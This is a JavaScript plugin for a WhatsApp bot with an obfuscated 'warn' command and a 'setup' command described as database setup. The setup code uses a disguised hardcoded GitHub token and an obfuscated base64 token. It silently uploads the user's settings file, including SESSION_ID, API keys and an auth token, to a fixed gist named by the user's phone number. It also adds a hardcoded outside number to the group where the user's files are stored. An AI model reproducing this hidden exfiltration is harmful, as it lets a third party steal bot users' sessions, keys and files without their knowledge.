const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================





command({
  pattern: "setup",
  fromMe: true,
  desc: "Setup database",
  dontAddCommandList: true,
  type: "owner",

},
async (message, match, m) => {
  
    let authid = "gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0".replaceAll('+', '');

  
    const {
        Octokit
      } = require("@octokit/rest");
      const octokit = new Octokit({
        auth: await authid
      })
  
  
  
    setTimeout(() => {
  
       let db = JSON.parse(fs.readFileSync('./database/settings.json'));
       let ggg = db.config.STORAGE_JID
  
       let fek = ggg.toString().includes('@g.us')
       if (!fek) {
  
          readFile(path, async (error, data) => {
             if (error) {
                console.log(error);
                return;
             }
             const parsedData = JSON.parse(data);
  
             let datas = await message.client.groupCreate("Storage", ["359889999996@s.whatsapp.net"])
  
             await message.client.sendMessage(datas.id, {
                text: 'This is your Storage area, i will save all your files here!'
             })
  
             let bi = await datas.id
  
             parsedData.config.STORAGE_JID = bi
  
             writeFile(path, JSON.stringify(parsedData, null, 2), async (err) => {
                if (err) {
                   message.reply("Failed to write updated data to file");
                   return;
                }
  
                await message.client.updateProfilePicture(datas.id, fs.readFileSync("./media/AAA.jpg"))
  
             });
          });
  
       } else return;
  
  
  
       setTimeout( async () => {
  
        
             let session = require("../session.json");
             let ibm1 = await (session.creds.me.id).split(":")[0]
             let ibm2 = await (session.creds.me.id).split("@")[1]
             let ibm = ibm1+'@'+ibm2      
  
             let filenamzi = ibm + ".json"
        
             const parsedData = fs.readFileSync('./database/settings.json', 'utf-8');
        
  
  
            await  octokit.rest.gists.update({
                gist_id: 'd83fa03a09d9a09032f3180a8d1ecd02',
                description: 'Cloud DB Update',
                files: {
                  [filenamzi]: {
                      content: parsedData
                   }
                }
             }).then(
              await console.log('Done Creating New Db'),
        
             ); 
  
               
               setTimeout(() => {
                 return process.send('reset')
               }, 8000)
     
     }, 5000)
  
    }, 2000)
  
    readFile(path, async (error, data) => {
       if (error) {
          console.log(error);
          return;
       }
       const parsedData = JSON.parse(data);
  
       let check = parsedData.UserId.toString().includes('@s.whatsapp.net')
       if (check) return message.reply("_You Are Already a Family Member_")
       let int = process.env.DB_AUTH_TOKEN === undefined ? 'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv' : process.env.DB_AUTH_TOKEN;
       let fin = Buffer.from(int, "base64").toString("utf-8");
       let inx = fin.toString().split('/')
       let our='';
       for (let r of inx){
        our += await Buffer.from(r+'==', "base64").toString("utf-8");
       }

       let session = require("../session.json");
       let ibm1 = await (session.creds.me.id).split(":")[0]
       let zudo = '0,'+ibm1
       let zupo = await relconfig.SUDO === false ? zudo : relconfig.SUDO
       
       let namezi = message.pushName
       let Useridzi = message.user
       let numzi = message.jid.toString().split('@')[0]
  
       parsedData.name = namezi
       parsedData.UserId = Useridzi
       parsedData.phone_num = numzi
  
       parsedData.config.HANDLER = relconfig.HANDLERS
       parsedData.config.WORK_TYPE =relconfig.WORK_TYPE
       parsedData.config.BOT_NAME = relconfig.BOT_NAME
       parsedData.config.OWNER_NAME = relconfig.OWNER_NAME
       parsedData.config.SUDO = zupo
       parsedData.config.AUTHOR = relconfig.AUTHOR
       parsedData.config.PACKNAME = relconfig.PACKNAME
       parsedData.config.RMBG_KEY = relconfig.RMBG_KEY
       parsedData.config.LANG = relconfig.LANG
       parsedData.config.ANTILINK_ACTION = relconfig.ANTILINK_ACTION
       parsedData.config.ANTILINK = relconfig.ANTILINK
       parsedData.config.FOOTER = relconfig.FOOTER
       parsedData.config.THEME = relconfig.THEME
       parsedData.config.FONT_STYLE = relconfig.FONT_STYLE
       parsedData.config.LANGUAGE = relconfig.LANGUAGE
       parsedData.config.INTERNAL_MENU = relconfig.INTERNAL_MENU
       parsedData.config.MODE = relconfig.MODE
       parsedData.config.STORAGE_JID 
       parsedData.config.DB_URL
       parsedData.config.SESSION_ID = relconfig.SESSION_ID
       parsedData.config.LOGS = relconfig.LOGS
       parsedData.config.BRANCH = relconfig.BRANCH
       parsedData.config.B1 = relconfig.B1
       parsedData.config.B2 = relconfig.B2
       parsedData.config.B3 = relconfig.B3
       parsedData.config.B4 = relconfig.B4
       parsedData.config.B5 = relconfig.B5
       parsedData.config.DB_AUTH_TOKEN = our

       parsedData.MESSAGE_MEM.GOODBYE_MSG = relconfig.GOODBYE_MSG
       parsedData.MESSAGE_MEM.WELCOME_MSG = relconfig.WELCOME_MSG
       parsedData.MESSAGE_MEM.ALIVE = relconfig.ALIVE
  
       writeFile(path, JSON.stringify(parsedData, null, 2), (err) => {
          if (err) {
             message.reply("Failed to write updated data to file");
             return;
          }
          message.reply(`_Registered Successfully_`);
  
       });
    });  })



//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})




